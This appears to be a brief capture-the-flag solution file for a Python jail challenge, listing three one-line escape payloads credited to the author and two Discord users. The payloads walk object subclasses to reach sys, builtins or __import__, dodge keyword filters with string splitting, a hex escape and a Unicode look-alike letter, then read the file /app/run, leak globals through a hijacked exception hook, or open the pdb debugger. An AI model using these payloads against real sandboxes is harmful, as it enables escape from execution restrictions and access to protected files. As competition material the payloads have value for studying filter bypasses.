# Exploit (as input)

(s:=().__class__.__base__.__subclasses__()[120]().load_module('sys'),s.__setattr__('excepthook',lambda *a:s.stdout.write(a[2].tb_frame.f_globals.__str__())),a)
# Original intended solution ^^^, but I've since saw quite a few better solutions

# such as 

0+(a:=().__class__.__base__.__subclasses__()[151].__len__.__globals__["__b"+"uiltins__"],a["print"](a["op""en"]("/app/run").read()))
# by Leo (https://discord.com/channels/969232688521281606/1378292097685262377/1378715661890621501)

().__class__.__base__.__subclasses__()[158]().__call__.__buil𝘵ins__[_:="__impor\x74__"]("pdb").set_trace()
# by hawke (https://discord.com/channels/969232688521281606/1378292097685262377/1378715771873529898)